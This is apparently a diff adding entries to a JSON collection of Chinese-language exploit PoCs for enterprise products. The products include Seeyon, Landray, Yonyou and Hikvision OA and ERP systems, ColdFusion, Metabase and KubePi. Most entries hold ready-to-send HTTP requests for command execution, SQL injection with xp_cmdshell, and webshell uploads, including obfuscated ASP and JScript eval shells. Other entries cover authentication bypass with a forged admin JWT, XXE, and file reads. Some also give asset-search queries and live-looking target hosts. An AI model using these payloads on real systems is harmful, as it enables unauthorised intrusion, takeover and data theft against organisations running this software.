+  "poc": "GET /log/decodmail.php?file=L2V0Yy9gc2xlZXAke0lGU30xMGAucGNhcA== HTTP/1.1 Host: x.x.x.x Cookie: PHPSESSID=c36d5527fd784aa29748b3b1c50be7bc User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Te: trailers Connection: close",
+  "label": "nday"
+ },
+ {
+  "vendor": "百卓",
+  "name": "百卓Smart S45F命令执行",
+  "type": "RCE",
+  "source": "TG",
+  "info": "fofa搜 app=\"Smart管理平台\" && body=\"S45F\"",
+  "date": "08.15",
+  "poc": "构造URL ：/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn 构造poc： POST /app/sys1.php HTTP/1.1Host: 60.22.74.195:8443Cookie: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Te: trailersConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 6 cmd=id",
+  "label": "nday"
+ },
+ {
+  "vendor": "红帆",
+  "name": "红帆OA iorepsavexml 任意文件上传",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=1.txt&filepath=/upfiles/rep/pic/ HTTP/1.1 Host: xx.xx.xx.xx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Content-Length: 0 test # http://ip/iOffice/upfiles/rep/pic/1.txt",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远OA /seeyon/ajax.do 后台命令执行",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "需登入致远：audit-admin/seeyon123456 POST /seeyon/ajax.do HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 uacq Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: JSESSIONID=CB1120AE205DAFD7FF70EAF5DC1241B9 Content-Length: 154 Connection: close method=ajaxAction&managerName=fileToExcelManager&managerMethod=saveExcelInBase&arguments=[\"../webapps/ROOT/ceshi.txt\",\"\",{\"columnName\":['HelloWorld']}]",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远任意文件读取",
+  "type": "任意文件读取",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /seeyon/wpsAssistServlet HTTP/1.1 Host: x.x.x.x User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 188 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip flag=template&templateUrl=%25%34%33%25%33%61%25%32%66%25%37%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%66%25%37%37%25%36%39%25%36%65%25%32%65%25%36%39%25%36%65%25%36%39",
+  "label": "nday"
+ },
+ {
+  "vendor": "蓝凌",
+  "name": "",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: www.ynjd.cn:801 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1) Accept: */* Connection: Keep-Alive Content-Length: 42 Content-Type: application/x-www-form-urlencoded var={\"body\":{\"file\":\"file:///etc/passwd\"}}",
+  "label": "nday"
+ },
+ {
+  "vendor": "通达",
+  "name": "zwsp-wps",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /Projects/FileUpload/Tools/UploadFile.ashx HTTP/1.1 Host: Content-Length: 1363 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7bFfdZVscDNXQa7r Accept: */* Origin: http://gasgaq.wiserbigdatas.com:10025 Referer: http://gasgaq.wiserbigdatas.com:10025/projects/ProjectFilesUpload.aspx Accept-Encoding: gzip, deflate Accept-Language: zh,zh-CN;q=0.9,zh-TW;q=0.8,en;q=0.7 Cookie: ASP.NET_SessionId=pxtueoxfndxnbtrgyz10ihoy Connection: close ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"guid\" wu_1h3qp4lpc1can1ft96qiu2hdm60 ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"Action\" DataHandleFile ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"handedDataId\" ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"projectid\" ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"explorationInfoId\" ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"datumid\" ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"id\" WU_FILE_3 ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"name\" aes.aspx ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"type\" application/xml ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"lastModifiedDate\" Fri May 19 2023 15:20:11 GMT+0800 (中国标准时间) ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"size\" 3 ------WebKitFormBoundary7bFfdZVscDNXQa7r Content-Disposition: form-data; name=\"file\"; filename=\"aes.aspx\" Content-Type: application/xml 123 ------WebKitFormBoundary7bFfdZVscDNXQa7r--",
+  "label": "1day"
+ },
+ {
+  "vendor": "通达",
+  "name": "zwsp-wps2",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /projects/Tools/upload_ajax.ashx?name=test%2eCEr HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Origin: null Connection: close Cookie: ASP.NET_SessionId=qhmszfcvfgyom4cya3ugwrqy Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 730 Hello Administrator! WelCome To Tas9er ASP Console!<% ReSpoNsE.CharSet = \"U\"&\"T\"&\"F\"&\"-\"&Chr(\"56\") govU9j70Rz1=Chr(\"49\")&Chr(\"54\")&\"ac\"&\"acc\"&Chr(\"48\")&Chr(\"53\")&\"aaf\"&Chr(\"97\")&Chr(\"102\")&Chr(\"54\")&\"7\" sEssION(\"gov3waPm\")=\"govucKcEUaYOmjr9\" %><%'govAxedxd%><% SeSsioN(\"k\")=govU9j70Rz1 SeSsIon(\"gov\")=\"https://\"&\"www.\"&\"shanghai.\"&\"gov.\"&\"cn\" govS1g9cc1W=ReQuest.TotalBytes %><%'govVq%><% govgo=REqUesT.BinaryRead(govS1g9cc1W) %><% SesSiOn.ConTentS.REmoVe(\"gov\") %><% FoR govbVy0e3wCX=Chr(\"49\") To govS1g9cc1W govKT6UNr=ascb(midb(govgo,govbVy0e3wCX,Chr(\"49\"))) Xor Asc(Mid(govU9j70Rz1,(govbVy0e3wCX and 15)+Chr(\"49\"),Chr(\"49\"))) govF9Ivuzv=govF9Ivuzv&Chr(govKT6UNr) Next %><%'gov7TPIm%><%ExecUte(govF9Ivuzv) %>",
+  "label": "1day"
+ },
+ {
+  "vendor": "金和",
+  "name": "金和OA C6任意文件上传",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "内容: POST /C6/Jhsoft.Web.module/eformaspx/editeprint.aspx?key=writefile&filename=1.ashx&KeyCode=sxfZyQBw8yQ=&designpath=/C6/&typeid=&sPathfceform=./ 放文件内容即可，但是没有包",
+  "label": "nday"
+ },
+ {
+  "vendor": "锐捷",
+  "name": "锐捷RG-BCR810W存在命令执行",
+  "type": "RCE",
+  "source": "微信",
+  "info": "",
+  "date": "08.15",
+  "poc": "tracert检测 www.baidu.com|id",
+  "label": "nday"
+ },
+ {
+  "vendor": "1Panel",
+  "name": "1Panel loadfile 后台文件读取漏洞",
+  "type": "任意文件读取",
+  "source": "TG",
+  "info": "1Panel后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件",
+  "date": "08.14",
+  "poc": "POST /api/v1/file/loadfile {\"paht\":\"/etc/passwd\"}",
+  "label": "nday"
+ },
+ {
+  "vendor": "Adobe",
+  "name": "Adobe ColdFusion远程代码执行漏洞（反序列化）",
+  "type": "RCE",
+  "source": "微信、TG",
+  "info": "CVE-2023-29300 /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true 请求体：ldap",
+  "date": "08.14",
+  "poc": "POST /CFIDE/adminapi/base.cfc?method= HTTP/1.1 Host: 1.2.3.4:1234 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 400 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip cmd: id argumentCollection= <wddxPacket version='1.0'> <header/> <data> <struct type='xcom.sun.rowset.JdbcRowSetImplx'> <var name='dataSourceName'> <string>ldap://xxx.xxx.xxx:1234/Basic/TomcatEcho</string> </var> <var name='autoCommit'> <boolean value='true'/> </var> </struct> </data> </wddxPacket>",
+  "label": "1day"
+ },
+ {
+  "vendor": "Apple",
+  "name": "苹果RCE Zero-Click Exploit Captured in the Wild",
+  "type": "RCE",
+  "source": "TG",
+  "info": "CVE-2021-30860",
+  "date": "08.14",
+  "poc": "Poc： https://github.com/jeffssh/CVE-2021-30860 Demo：https://twitter.com/jeffssh/status/1690845469495132160",
+  "label": "1day"
+ },
+ {
+  "vendor": "Google",
+  "name": "chrome 最新版pdf rce",
+  "type": "RCE",
+  "source": "TG、微信",
+  "info": "",
+  "date": "08.14",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "Google",
+  "name": "chrome 最新版rce",
+  "type": "RCE",
+  "source": "TG、微信",
+  "info": "",
+  "date": "08.14",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "Google",
+  "name": "wechat 最新版rce",
+  "type": "RCE",
+  "source": "TG、微信",
+  "info": "",
+  "date": "08.14",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "Jeecg-Boot",
+  "name": "Jeecg-Boot Freemarker 模版注入漏洞",
+  "type": "RCE",
+  "source": "TG",
+  "info": "1、如果被攻击者利用，可直接getshell； 2、如果被攻击者利用，可被用于内网信息收集，扫描目标内网主机； 3、如果被攻击者利用，可攻击运行在内网或本地的应用程序； 4、如果被攻击者利用，可被用作攻击跳板； 修复方法 Jeecg官方暂未修复该漏洞，无法通过升级JeecgBoot版本修复该漏洞，建议： 1、临时禁用Freemarker高危的代码执行类，如：freemarker.template.utility.Execute（ftl利用方式较多，请自行判断）",
+  "date": "08.14",
+  "poc": "c",
+  "label": "1day"
+ },
+ {
+  "vendor": "Metabase",
+  "name": "Metabase validate 远程命令执行漏洞",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "先访问 /api/session/properties 获取token 然后POST /api/setup/validate HTTP/1.1 Host: Content-Type: application/json Content-Length: 812 { \"token\": \"token\", \"details\": { \"is_on_demand\": false, \"is_full_sync\": false, \"is_sample\": false, \"cache_ttl\": null, \"refingerprint\": false, \"auto_run_queries\": true, \"schedules\": {}, \"details\": { \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('执行命令处')\\n$$--=x\", \"advanced-options\": false, \"ssl\": true }, \"name\": \"an-sec-research-team\", \"engine\": \"h2\" } }",
+  "label": "nday"
+ },
+ {
+  "vendor": "Milesight",
+  "name": "Milesight VPN server.js 任意文件读取漏洞",
+  "type": "任意文件读取",
+  "source": "微信",
+  "info": "/../etc/passwd MilesightVPN 是一款软件，一个 Milesight 产品的 VPN 通道设置过程更加完善，并可通过网络服务器界面连接状态。其中任意存在文件读取监控漏洞，攻击者通过漏洞可以获取服务器中敏感文件",
+  "date": "08.14",
+  "poc": "GET /../etc/passwd HTTP/1.1 Host: Accept: / Content-Type: application/x-www-form-urlencoded",
+  "label": "0day"
+ },
+ {
+  "vendor": "Openfire",
+  "name": "Openfire身份认证绕过漏洞",
+  "type": "认证绕过",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "GET /user-create.jsp?csrf=Sio3WOA89y2L9Rl&username=user1&name=&email=&password=Qwer1234&passwordConfirm=Qwer1234&isadmin=on&create=............ HTTP/1.1",
+  "label": "nday"
+ },
+ {
+  "vendor": "PigCMS",
+  "name": "PigCMS action_flashUpload 任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "/cms/manage/admin.php?m=manage&c=background&a=action_flashUpload",
+  "date": "08.14",
+  "poc": "POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1 Host: Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=----aaa ------aaa Content-Disposition: form-data; name=\"filePath\"; filename=\"test.php\" Content-Type: video/x-flv <?php phpinfo();?> ------aaa /cms/upload/images/2023/08/11/1691722887xXbx.php",
+  "label": "1day"
+ },
+ {
+  "vendor": "SolarView",
+  "name": "SolarView Compact downloader.php 任意命令执行漏洞",
+  "type": "RCE",
+  "source": "TG",
+  "info": "CVE-2023-23333 /downloader.php?file=;echo URL请求： base64、bash",
+  "date": "08.14",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "Yakit",
+  "name": "Yakit任意文件读取",
+  "type": "任意文件读取",
+  "source": "TG",
+  "info": "yakit是近年新兴的一个BurpSuite平替工具，和burp的区别就在于数据包放过去不用配置ip端口协议这些，但是yakit跑起来感觉卡卡的，远不如burp那么流畅，近期yakit爆出了一个任意文件读取漏洞，此漏洞通过在网页嵌入js代码实现读取yakit使用者设备上的文件 触发版本： 引擎版本< Yaklang 1.2.4-sp2 漏洞条件： 使用yakit的MITM代理并且启用任意插件",
+  "date": "08.14",
+  "poc": "<script> const xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http://yakit.com/filesubmit\"); xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); xhr.send(`file={{base64enc(file(C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts))}}`); </script>",
+  "label": "1day"
+ },
+ {
+  "vendor": "万户",
+  "name": "万户 ezOFFICE 协同办公平台 wpsservlet 接口文件上传漏洞",
+  "type": "文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "CContent-Disposition: form-data; name=\"file\"; filename=\"1.png\"",
+  "label": "nday"
+ },
+ {
+  "vendor": "任我行",
+  "name": "任我行 CRM SmsDataList SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 170 Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000*",
+  "label": "nday"
+ },
+ {
+  "vendor": "企业微信",
+  "name": "企业微信0day",
+  "type": "信息泄露",
+  "source": "微信",
+  "info": "/cgi-bin/gateway/agentinfo",
+  "date": "08.14",
+  "poc": "第一步：，通过泄露信息接口可以获取corpid和corpsecret https://<企业微信域名>/cgi-bin/gateway/agentinfo 第二步，使用corpsecret和corpid获得token https://<企业微信域名>/cgi-bin/gettoken?corpid=ID&corpsecret=SECRET 第三步，使用token访问诸如企业通讯录信息，修改用户密码，发送消息，云盘等接口 https://<企业微信域名>/cgi-bin/user/get?access_token=ACCESS_TOKEN&userid=USERID",
+  "label": "nday"
+ },
+ {
+  "vendor": "北信源",
+  "name": "北信源终端安全管理存在远程代码执行",
+  "type": "RCE",
+  "source": "网传",
+  "info": "未知",
+  "date": "08.14",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "华天动力",
+  "name": "华天动力oa8000 布尔盲注sql注入",
+  "type": "SQL注入",
+  "source": "TG",
+  "info": "/report/reportServlet?action=",
+  "date": "08.14",
+  "poc": "POST /report/reportServlet?action=8 HTTP/1.1 Host: ip:port Content-Length: 118 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://ip:port Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://ip:port/report/reportServlet?action=8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=e5b1b1e6b5b7e4b98be585b3 Connection: close year=&userName=&startDate=&endDate=&dutyRule=*&resultPage=%2FreportJsp%2FshowReport.jsp%3Fraq%3D%252FJourTemp2.raq",
+  "label": "nday"
+ },
+ {
+  "vendor": "安恒",
+  "name": "安恒明御安全网关 aaa_local_web_preview 文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "POST /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../shell.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip Content-Length: 671 --849978f98abe41119122148e4aa65b1a Content-Disposition: form-data; name=\"shell\"; filename=\"shell.php\" Content-Type: text/plain <?php php 马?> --849978f98abe41119122148e4aa65b1a",
+  "label": "nday"
+ },
+ {
+  "vendor": "帆软",
+  "name": "帆软fineReport 10任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "微信",
+  "info": "/webroot/decision/url/attach/upload?width=32&height=32&filename=",
+  "date": "08.14",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "广联达",
+  "name": "广联达oa 后台文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1 Host: 10.10.10.1:8888 X-Requested-With: Ext.basex Accept: text/html, application/xhtml+xml, image/jxr, */* Accept-Language: zh-Hans-CN,zh-Hans;q=0.5 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj Accept: */* Origin: http://10.10.10.1 Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&menuitemid=120743&frame=1&modulecode=GTP.Workflow.TaskCenterModule&tabID=40 Cookie: Connection: close Content-Length: 421 ------WebKitFormBoundaryFfJZ4PlAZBixjELj Content-Disposition: form-data; filename=\"1.aspx\";filename=\"1.jpg\" Content-Type: application/text <%@ Page Language=\"Jscript\" Debug=true%> <% var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD'; var GFMA=Request.Form(\"qmq1\"); var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1); eval(GFMA, ONOQ); %>",
+  "label": "nday"
+ },
+ {
+  "vendor": "库贝派",
+  "name": "KubePi JwtSigKey 登陆绕过漏洞",
+  "type": "认证绕过",
+  "source": "TG",
+  "info": "CVE-2023-22463 KubePi 中存在 JWT 硬编码，攻击者通过硬编码可以获取服务器后台管理权限，添加任意用户",
+  "date": "08.14",
+  "poc": "POST /kubepi/api/v1/users HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36 accept: application/json Accept-Encoding: gzip, deflate Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8 { \"authenticate\": { \"password\": \"{{randstr}}\" }, \"email\": \"{{randstr}}@qq.com\", \"isAdmin\": true, \"mfa\": { \"enable\": false }, \"name\": \"{{randstr}}\", \"nickName\": \"{{randstr}}\", \"roles\": [ \"Supper User\" ] }",
+  "label": "nday"
+ },
+ {
+  "vendor": "明源",
+  "name": "明源erp sql注入漏洞",
+  "type": "SQL注入",
+  "source": "TG",
+  "info": "/cgztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=",
+  "date": "08.14",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "明源",
+  "name": "明源云 ERP ApiUpdate.ashx 文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1Host: target.com Accept-Encoding: gzip User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 856 {{unquote(\"PK\\x03\\x04\\x14\\x00\\x00\\x00\\x08\\x00\\xf2\\x9a\\x0bW\\x97\\xe9\\x8br\\x8c\\x00\\x00\\x00\\x93\\x00\\x00\\x00\\x1e\\x00\\x00\\x00../../../fdccloud/_/check.aspx$\\xcc\\xcb\\x0a\\xc20\\x14\\x04\\xd0_\\x09\\x91B\\xbb\\x09\\x0a\\xddH\\xab\\x29\\x8aP\\xf0QZ\\xc4\\xf5m\\x18j!ib\\x1e\\x82\\x7fo\\xc4\\xdd0g\\x98:\\xdb\\xb1\\x96F\\xb03\\xcdcLa\\xc3\\x0f\\x0b\\xce\\xb2m\\x9d\\xa0\\xd1\\xd6\\xb8\\xc0\\xae\\xa4\\xe1-\\xc9d\\xfd\\xc7\\x07h\\xd1\\xdc\\xfe\\x13\\xd6%0\\xb3\\x87x\\xb8\\x28\\xe7R\\x96\\xcbr5\\xacyQ\\x9d&\\x05q\\x84B\\xea\\x7b\\xb87\\x9c\\xb8\\x90m\\x28<\\xf3\\x0e\\xaf\\x08\\x1f\\xc4\\xdd\\x28\\xb1\\x1f\\xbcQ1\\xe0\\x07EQ\\xa5\\xdb/\\x00\\x00\\x00\\xff\\xff\\x03\\x00PK\\x01\\x02\\x14\\x03\\x14\\x00\\x00\\x00\\x08\\x00\\xf2\\x9a\\x0bW\\x97\\xe9\\x8br\\x8c\\x00\\x00\\x00\\x93\\x00\\x00\\x00\\x1e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00../../../fdccloud/_/check.aspxPK\\x05\\x06\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00L\\x00\\x00\\x00\\xc8\\x00\\x00\\x00\\x00\\x00\")}}",
+  "label": "0day"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微 HrmCareerApplyPerView S Q L 注入漏洞",
+  "type": "SQL注入",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "GET /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 HTTP/1.1 Host: 127.0.0.1:7443 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Accept-Encoding: gzip, deflate Connection: close",
+  "label": "nday"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视iSecureCenter综合安防管理平台files前台上传命令执行",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "POST /center/api/files;.html HTTP/1.1Host: 10.10.10.10Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54aContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components /tomcat85linux64.1/webapps/eportal/new.jsp\"Content-Type: application/zip <%jsp 的马%>------WebKitFormBoundary9PggsiM755PLa54a--",
+  "label": "nday"
+ },
+ {
+  "vendor": "深信服",
+  "name": "深信服数据中心管理系统 XML 实体注入漏洞",
+  "type": "XML实体注入",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "GET /src/sangforindex HTTP/1.1 Host: ip:port Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Accept: text/xml,application/xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Type: text/xml Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: Keep-alive Content-Length: 135 <?xml version=\"1.0\" encoding=\"utf-8\" ?><!DOCTYPE root [ <!ENTITY rootas SYSTEM \"http://dnslog\"> ]> <xxx> &rootas; </xxx>",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友文件服务器认证绕过",
+  "type": "认证绕过",
+  "source": "TG",
+  "info": "资产搜索：app=\"用友-NC-Cloud\" 或者是app=\"用友-NC-Cloud\" && server==\"Apache-Coyote/1.1\"",
+  "date": "08.14",
+  "poc": "POST数据包修改返回包 false改成ture就可以绕过登陆 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Date: Thu, 10 Aug 2023 20:38:25 GMT Connection: close Content-Length: 17 {\"login\":\"false\"}",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友时空 KSOA PayBill SQL 注入漏洞",
+  "type": "SQL注入",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "POST /servlet/PayBill?caculate&_rnd= HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12. Content-Length: 134 Accept-Encoding: gzip, deflate Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';-</name><name>1</nam 命令执行: exec master..xp_cmdshell 'whoami';",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友时空 KSOA servletimagefield 文件 sKeyvalue 参数 SQL 注入漏洞",
+  "type": "SQL注入",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
